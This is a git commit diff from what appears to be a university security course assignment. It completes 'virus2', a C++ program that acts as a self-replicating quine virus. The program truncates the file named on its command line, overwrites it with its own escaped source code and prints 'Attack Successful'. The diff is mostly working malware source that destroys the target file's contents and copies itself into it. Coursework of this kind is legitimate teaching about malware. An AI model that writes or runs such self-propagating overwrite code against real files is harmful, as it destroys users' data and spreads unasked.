db8abe9331b28545433f79ed4011467f68303061
Dhesant Nakka <dhesant@gmail.com>
2017-03-07 15:33:35 +0800

    a1: finished virus2

--- Ass1/virus2/virus2.cpp
+++ Ass1/virus2/virus2.cpp
@@ -6,40 +6,84 @@
 #include <cstring>
 
 std::string code = "\
-// COMP3632 Assignment 1 virus2.cpp\n\r\
-// Dhesant Nakka | 20146587\n\r\
-\n\r\
-#include <iostream>\n\r\
-#include <fstream>\n\r\
-#include <cstring>\n\r\
-\n\r\
-std::string code = \"Testing\"\n\r\
-\n\r\
-int main (int argc, char** argv) {\n\r\
-    // Ensure valid argument\n\r\
-    if (argc < 1) {\n\r\
-	std::cout << \"No target specified\" << std::endl;\n\r\
-	return 1;\n\r\
-    }\n\r\
-    \n\r\
-    std::cout << \"Opening: \" << argv[1] << std::endl;\n\r\
-    \n\r\
-    std::fstream fs;\n\r\
-    fs.open(argv[1], std::fstream::out | std::fstream::trunc);\n\r\
-    \n\r\
-    if (!fs.is_open()) {\n\r\
-	std::cout << \"File opening failed\" << std::endl;\n\r\
-	return 1;\n\r\
-    }\n\r\
-    \n\r\
-    fs.write(code.c_str(), code.size());\n\r\
-    \n\r\
-    fs.close();\n\r\
-    std::cout << \"Attack Successful. Have a nice day!\" << std::endl;\n\r\
-    \n\r\
-    return 0;\n\r\
-}\n\r\
+// COMP3632 Assignment 1 virus2.cpp\n\
+// Dhesant Nakka | 20146587\n\
+\n\
+#include <iostream>\n\
+#include <fstream>\n\
+#include <cstring>\n\
+\n\
+std::string code = \"@@\";\n\
+\n\
+std::string escape_string(std::string in) {\n\
+    std::string out;\n\
+    \n\
+    for (std::size_t i = 0; i < in.size(); ++i) {\n\
+	if (in[i] == '\\\\')\n\
+	    out += \"\\\\\\\\\";\n\
+	else if (in[i] == '\\n')\n\
+	    out += \"\\\\n\\\\\\n\";\n\
+	else if (in[i] == '\\\"')\n\
+	    out += \"\\\\\\\"\";\n\
+	else\n\
+	    out += in[i];\n\
+    }\n\
+    \n\
+    return out;\n\
+}\n\
+\n\
+int main (int argc, char** argv) {\n\
+    // Ensure valid argument\n\
+    if (argc < 1) {\n\
+	std::cout << \"No target specified\" << std::endl;\n\
+	return 1;\n\
+    }\n\
+    \n\
+    std::cout << \"Opening: \" << argv[1] << std::endl;\n\
+    \n\
+    std::fstream fs;\n\
+    fs.open(argv[1], std::fstream::out | std::fstream::trunc);\n\
+    \n\
+    if (!fs.is_open()) {\n\
+	std::cout << \"File opening failed\" << std::endl;\n\
+	return 1;\n\
+    }\n\
+    \n\
+    std::size_t pos = code.find(\"@@\");\n\
+    \n\
+    std::string token = code.substr(0,pos);\n\
+    \n\
+    fs.write(token.c_str(), token.size());\n\
+    \n\
+    token = escape_string(code);\n\
+    fs.write(token.c_str(), token.size());\n\
+    \n\
+    token = code.substr(pos+2);\n\
+    fs.write(token.c_str(), token.size());\n\
+    \n\
+    fs.close();\n\
+    std::cout << \"Attack Successful. Have a nice day!\" << std::endl;\n\
+    \n\
+    return 0;\n\
+}\
 ";
+
+std::string escape_string(std::string in) {
+    std::string out;
+
+    for (std::size_t i = 0; i < in.size(); ++i) {
+	if (in[i] == '\\')
+	    out += "\\\\";
+	else if (in[i] == '\n')
+	    out += "\\n\\\n";
+	else if (in[i] == '\"')
+	    out += "\\\"";
+	else
+	    out += in[i];
+    }
+    
+    return out;
+}
 
 int main (int argc, char** argv) {
     // Ensure valid argument
@@ -59,7 +103,17 @@ int main (int argc, char** argv) {
 	return 1;
     }
     
-    fs.write(code.c_str(), code.size());
+    std::size_t pos = code.find("@@");
+
+    std::string token = code.substr(0,pos);
+
+    fs.write(token.c_str(), token.size());
+
+    token = escape_string(code);
+    fs.write(token.c_str(), token.size());
+    
+    token = code.substr(pos+2);
+    fs.write(token.c_str(), token.size());
     
     fs.close();
     std::cout << "Attack Successful. Have a nice day!" << std::endl;
